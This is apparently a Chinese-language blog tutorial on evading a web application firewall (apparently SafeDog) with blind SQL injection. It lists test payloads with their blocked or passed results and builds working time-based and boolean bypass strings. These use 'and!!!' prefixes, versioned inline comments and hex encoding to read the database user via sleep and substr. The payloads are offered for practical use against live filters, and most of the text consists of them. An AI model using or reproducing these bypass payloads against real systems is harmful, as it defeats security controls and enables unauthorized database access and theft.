# 0x00 延时过狗
盲注过狗相对联合注入来说，感觉上是更简单，我们先来试试时间盲注把，比布尔稍稍灵活一点
```
 if(1,1,1) 不拦截
 a if(1,1,1) 不拦截
 and if(1,1,1) 拦截
 | if(1,1,1) 不拦截
 || if(1,1,1) 拦截
 && if(1,1,1) 拦截
/*!and*/ if(1,1,1) 拦截
 /*!11440and*/ if(1,1,1) 不拦截
 andaif(1,1,1) 不拦截
```
通过上面的测试我们其实可以很简单的看出来 他是拦截的 xx if 这个语句，其中xx 为and 和 or 这2个词有点敏感，但是绕过还是可以的
通过上一章的测试语句 发现版本为 11440的 内联注释直接放行，咳咳这样后面就直接注入，感觉并不是我们这一章想要的，我们这一章来试试不用内联注释内不内绕过
查阅乌云知识库发现一个小知识点 `and!!!1=1 `  and后面可以接上奇数个特殊的字符包括不限于`! ~ & -` 其他还可以自己测试 那么我们的payload就能构造出来了
```
and!!!if((substr((select hex(user/**/(/*!*/))),1,1)>1),sleep/**/(/*!5*/),1)
```
系统函数怎绕过我就不多说了每一张就有
# 0x01 布尔过狗
布尔注入过狗只能说是相对来说最简单的吧，因为可以不使用条件语句，少了一个绕过点
```
and!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)='r' 拦截
and!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)=r 不拦截
and!!!substr((select unhex(hex(user/**/(/*!*/)))),1,1)=1 不拦截
```
上面忘了说的就是这个点 =r 这里 不能使用引号，那绕过他就很简单了 什么 HEX ASCII 都行,通过测试发现 使用布尔盲注 他的过滤真的很差，我们试试 把and 换成&&
```
and substr((select hex(user/**/(/*!*/))),1,1)>1 拦截
/*!and*/ substr((select hex(user/**/(/*!*/))),1,1)>1 拦截
%26%26 substr((select hex(user/**/(/*!*/))),1,1)>1 拦截
/*!%26%26*/ substr((select hex(user/**/(/*!*/))),1,1)>1 不拦截
```
# 0x02 文末
自己不测试 永远发现不了新东西
#### 本文如有错误，请及时提醒，避免误导他人
* author：404